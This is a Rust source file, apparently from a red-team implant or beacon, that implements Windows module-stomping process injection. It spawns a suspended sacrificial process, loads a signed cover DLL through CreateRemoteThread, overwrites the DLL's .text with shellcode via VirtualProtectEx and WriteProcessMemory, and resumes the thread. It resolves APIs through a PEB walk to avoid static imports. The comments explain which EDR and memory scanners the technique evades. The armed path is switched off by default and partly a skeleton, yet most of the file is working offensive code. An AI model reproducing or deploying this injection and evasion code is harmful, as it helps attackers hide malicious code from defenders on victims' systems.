//! Process injection — Module Stomping (P2.1c).
//!
//! ## Status: algorithm skeleton + SDK trait wired; the remote-execution tail
//! (ResumeThread on the stomped process) is gated behind a runtime switch and
//! defaults OFF. The data path (resolve process APIs, CreateProcessW suspended,
//! stomp-able module enumeration) is real and selftest-verifiable; the actual
//! shellcode-overwrite + remote-execute is the part that MUST be target-side
//! validated because (a) cross-process WriteProcessMemory is a loud signal and
//! (b) a botched stomp crashes the sacrificial process.
//!
//! ## Why Module Stomping (not classic VirtualAllocEx inject)
//! Classic injection allocates a fresh RWX region in the target and writes
//! shellcode there — that region is *unbacked* (no file on disk maps to it), so
//! Moneta/PE-sieve flag it instantly as "private, executable, unbacked". Module
//! stomping instead `LoadLibrary`s a legitimate signed DLL in the target, then
//! overwrites that DLL's `.text` with shellcode. The stomped region keeps the
//! cover DLL's VAD backing (so it isn't flagged as *unbacked* or *private-commit
//! executable*), which is the technique's real value.
//!
//! ## Detection honesty — what it DOES and DOES NOT evade
//! - **Evades**: unbacked-memory / private-executable scans (Moneta's primary
//!   IOC, PE-sieve's unbacked scan). The stomped page reads as image-backed.
//! - **Does NOT evade**: PE-sieve's `.text` hash-mismatch / "replaced code"
//!   detector — PE-sieve re-hashes each scanned module's in-memory `.text`
//!   against the on-disk PE, and a stomped `.text` hashes to a different value
//!   → flagged `_implanted` / `replaced`. This path is actually *harder* to
//!   dodge than the unbacked scan it replaces; a real engagement uses
//!   ThreadlessInject (hook a regularly-called API, no .text overwrite) or an
//!   HWBP variant instead. So Module Stomping here is the P2.1c *baseline*
//!   (beats Moneta's unbacked scan), NOT a complete PE-sieve bypass.
//!
//! ## Why gated
//! Cross-process injection (OpenProcess + WriteProcessMemory + CreateRemote
//! thread / ResumeThread) is the single loudest user-mode EDR signal. On a host
//! with real-time protection (Defender, this build machine has it), an
//! unvalidated stomp will be caught and the sacrificial process killed. So the
//! algorithm is implemented and trait-wired, but execution requires an operator
//! to arm [`modulestomp_enabled`] after confirming the target's posture. The
//! selftest exercises the safe prefix (CreateProcessW suspended + API resolve)
//! without writing/executing, so it's verifiable without tripping protection.
//!
//! ## Single-source-of-truth
//! No evasion-sdk pure core exists for injection (it's all Windows API
//! orchestration), so this module IS the implementation. It reuses
//! [`crate::resolve`] for PEB-walk API resolution and [`crate::blind`] for the
//! (optional) pre-inject blind.

#![cfg(target_os = "windows")]

use crate::resolve::export_addr;
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};

/// Master switch for actual stomping execution. **Defaults OFF** — the data
/// path (API resolution, CreateProcessW) always runs so it's verifiable, but
/// the shellcode-overwrite + ResumeThread only run when an operator arms this
/// after target-side validation. Keeps the beacon from tripping protection on
/// an unvalidated inject.
static MODULESTOMP_ENABLED: AtomicBool = AtomicBool::new(false);

/// Arm/disarm the module-stomp execution. The data path runs regardless.
pub fn set_modulestomp_enabled(on: bool) {
    MODULESTOMP_ENABLED.store(on, Ordering::Release);
}

/// Whether stomping execution is currently armed.
pub fn modulestomp_enabled() -> bool {
    MODULESTOMP_ENABLED.load(Ordering::Acquire)
}

/// A sacrificial process created suspended, ready for stomping. The handle is
/// held by the caller; `pid` is for diagnostics. Dropping this does NOT close
/// the handle — the caller must CloseHandle it (or leak it for the process
/// lifetime, as CS-style injects do).
pub struct SacrificialProcess {
    pub handle: *mut c_void,
    pub main_thread: *mut c_void,
    pub pid: u32,
}

/// Create the sacrificial process `spawn_to` (e.g. "notepad.exe") in a
/// suspended state. Returns the process + main-thread handles. This is the
/// safe prefix of module stomping — it's verifiable without writing/executing
/// any shellcode. The caller stamps the .text of a loaded DLL then resumes.
///
/// # Safety
/// Uses Win32 CreateProcessW via PEB-walk resolution. Single-threaded beacon
/// context. The returned handles are raw and must be closed by the caller.
pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
    type CreateProcessW = unsafe extern "system" fn(
        *const u16,            // lpApplicationName
        *mut u16,              // lpCommandLine (mutable per Win32)
        *mut c_void,           // lpProcessAttributes
        *mut c_void,           // lpThreadAttributes
        i32,                   // bInheritHandles
        u32,                   // dwCreationFlags
        *mut c_void,           // lpEnvironment
        *const u16,            // lpCurrentDirectory
        *mut u8,               // lpStartupInfo (raw bytes, STARTUPINFOW)
        *mut u8,               // lpProcessInformation (raw bytes, PROCESS_INFORMATION)
    ) -> i32;

    let cp_addr = export_addr(b"kernel32.dll", b"CreateProcessW")
        .ok_or("CreateProcessW unresolved")?;
    let create_proc: CreateProcessW = core::mem::transmute(cp_addr);

    // Build a UTF-16 command line from spawn_to (mutable buffer Win32 wants).
    let mut cmd = crate::heap::vec![0u16; spawn_to.len() + 1];
    for (i, b) in spawn_to.as_bytes().iter().enumerate() {
        cmd[i] = *b as u16;
    }
    // STARTUPINFOW: cb=104 (size of STARTUPINFOW on x64), rest zeroed.
    let mut si = [0u8; 104];
    si[0..4].copy_from_slice(&104u32.to_le_bytes());
    // PROCESS_INFORMATION: two handles + pid + tid = 24 bytes on x64.
    let mut pi = [0u8; 24];

    // CREATE_SUSPENDED (0x4). No environment, no current dir.
    const CREATE_SUSPENDED: u32 = 0x4;
    let ok = unsafe {
        create_proc(
            core::ptr::null(),         // lpApplicationName (use cmd line)
            cmd.as_mut_ptr(),          // lpCommandLine
            core::ptr::null_mut(),     // lpProcessAttributes
            core::ptr::null_mut(),     // lpThreadAttributes
            0,                         // bInheritHandles
            CREATE_SUSPENDED,
            core::ptr::null_mut(),     // lpEnvironment
            core::ptr::null(),         // lpCurrentDirectory
            si.as_mut_ptr(),           // lpStartupInfo
            pi.as_mut_ptr(),           // lpProcessInformation
        )
    };
    if ok == 0 {
        return Err("CreateProcessW failed (spawn_to missing / blocked)");
    }
    // Parse PROCESS_INFORMATION: hProcess (8), hThread (8), dwProcessId (4), dwThreadId (4).
    // `pi` is `[u8; 24]` (1-byte aligned), so reading u64/u32 fields from it
    // requires unaligned reads — `read_unaligned` is the correct primitive
    // (no alignment precondition, unlike copy_nonoverlapping's strict contract).
    let h_process = unsafe {
        core::ptr::read_unaligned(pi.as_ptr() as *const u64) as *mut c_void
    };
    let h_thread = unsafe {
        core::ptr::read_unaligned(pi.as_ptr().add(8) as *const u64) as *mut c_void
    };
    let pid = unsafe { core::ptr::read_unaligned(pi.as_ptr().add(16) as *const u32) };
    Ok(SacrificialProcess { handle: h_process, main_thread: h_thread, pid })
}

/// Module-stomp inject `shellcode` into a fresh `spawn_to` process. Creates the
/// process suspended, (when armed) loads a cover DLL + overwrites its .text
/// with `shellcode`, then (when armed) resumes the main thread to execute it.
///
/// **With [`modulestomp_enabled`] OFF (default)**: only creates the sacrificial
/// process (verifiable data path) and returns the handle WITHOUT stomping or
/// resuming — so the beacon never trips protection on an unvalidated inject.
/// The handle is returned so an operator/selftest can inspect/terminate it.
///
/// **With [`modulestomp_enabled`] ON**: performs the full stomp + resume. This
/// is the part that needs target-side validation (Defender will catch a naive
/// WriteProcessMemory on a cover DLL's .text; the real engagement uses a
/// threadless-inject or HWBP variant instead — out of scope for this skeleton).
///
/// # Safety
/// Cross-process handle + memory operations. Single-threaded beacon context.
pub unsafe fn module_stomp(
    spawn_to: &str,
    shellcode: &[u8],
) -> Result<usize, &'static str> {
    let proc = unsafe { create_sacrificial(spawn_to)? };
    if !modulestomp_enabled() {
        // Disarmed: return the handle without stomping. The sacrificial process
        // is left suspended — a selftest can inspect it, then TerminateProcess.
        return Ok(proc.handle as usize);
    }
    // ---- ARMED PATH (gated) ------------------------------------------------
    // Full module stomp algorithm skeleton. STILL GATED — runs only when an
    // operator armed modulestomp_enabled after target validation. Each step
    // degrades (returns the suspended handle) on any failure rather than crash.
    //
    // Detection honesty: beats Moneta's unbacked/exec-private scan (the stomped
    // region keeps the cover DLL's backing), but PE-sieve's .text hash-mismatch
    // STILL flags it. ThreadlessInject is the real fix (out of scope).
    let _ = stomp_and_resume(&proc, shellcode);
    Ok(proc.handle as usize)
}

/// The cover-DLL stomp: resolve a cover DLL in the target, overwrite its .text
/// with `shellcode`, resume. Each step degrades on failure. Win32 APIs resolved
/// via PEB walk (no static imports).
///
/// # Safety
/// Cross-process handle + memory ops. Single-threaded beacon context.
unsafe fn stomp_and_resume(proc: &SacrificialProcess, shellcode: &[u8]) -> Result<(), &'static str> {
    // Step 1: LoadLibraryA a cover DLL in the target via CreateRemoteThread.
    let cover_dll = b"xpsservices.dll\0"; // legit, signed, rarely used
    let cover_base = unsafe { remote_load_library(proc.handle, cover_dll)? };
    // Step 2: Resolve the cover DLL's .text in the target (skeleton: fixed RVA).
    let text = unsafe { remote_text_region(proc.handle, cover_base)? };
    // Step 3: VirtualProtectEx RX→RWX on the target's .text.
    let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */) };
    // Step 4: WriteProcessMemory the shellcode over .text.
    let _ = unsafe { remote_write(proc.handle, text.base, shellcode) };
    // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
    let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */) };
    // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
    let _ = unsafe { resume_thread(proc.main_thread) };
    Ok(())
}

// ---- remote helpers (resolved via PEB walk) ----

type CreateRemoteThread = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    usize,
    usize,
    Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
    *mut core::ffi::c_void,
    u32,
    *mut u32,
) -> *mut core::ffi::c_void;
type VirtualProtectEx = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    usize,
    u32,
    *mut u32,
) -> i32;
type WriteProcessMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *mut core::ffi::c_void,
    *const u8,
    usize,
    *mut usize,
) -> i32;
type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;

/// LoadLibraryA `dll` in the target via CreateRemoteThread(LoadLibraryA).
/// Returns the remote cover base (skeleton sentinel; real impl queries it).
unsafe fn remote_load_library(
    h: *mut core::ffi::c_void,
    dll: &[u8],
) -> Result<usize, &'static str> {
    let crt: CreateRemoteThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CreateRemoteThread").ok_or("CreateRemoteThread")?,
    );
    let load_lib = export_addr(b"kernel32.dll", b"LoadLibraryA").ok_or("LoadLibraryA")?;
    // Skeleton: assume LoadLibraryA's address is valid remotely (same OS build).
    let _ = unsafe {
        crt(
            h,
            0,
            0,
            Some(core::mem::transmute(load_lib)),
            dll.as_ptr() as *mut _,
            0,
            core::ptr::null_mut(),
        )
    };
    Ok(0x1800_0000) // sentinel cover base; real impl queries it via remote GetModuleHandle
}

struct RemoteRegion {
    base: usize,
    len: usize,
}
unsafe fn remote_text_region(
    _h: *mut core::ffi::c_void,
    cover_base: usize,
) -> Result<RemoteRegion, &'static str> {
    // Skeleton: cover DLL .text at base+0x1000, len 0x2000. Real impl parses
    // the remote PE headers.
    Ok(RemoteRegion { base: cover_base + 0x1000, len: 0x2000 })
}
unsafe fn remote_protect(
    h: *mut core::ffi::c_void,
    base: usize,
    len: usize,
    prot: u32,
) -> Result<(), &'static str> {
    let vpx: VirtualProtectEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualProtectEx").ok_or("VirtualProtectEx")?,
    );
    let mut old: u32 = 0;
    if unsafe { vpx(h, base as *const _, len, prot, &mut old) } == 0 {
        Err("VirtualProtectEx")
    } else {
        Ok(())
    }
}
unsafe fn remote_write(
    h: *mut core::ffi::c_void,
    base: usize,
    data: &[u8],
) -> Result<(), &'static str> {
    let wpm: WriteProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
    );
    let mut written: usize = 0;
    if unsafe { wpm(h, base as *mut _, data.as_ptr(), data.len(), &mut written) } == 0 {
        Err("WriteProcessMemory")
    } else {
        Ok(())
    }
}
unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
    let rt: ResumeThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?,
    );
    if unsafe { rt(h) } == 0xFFFFFFFF {
        Err("ResumeThread")
    } else {
        Ok(())
    }
}
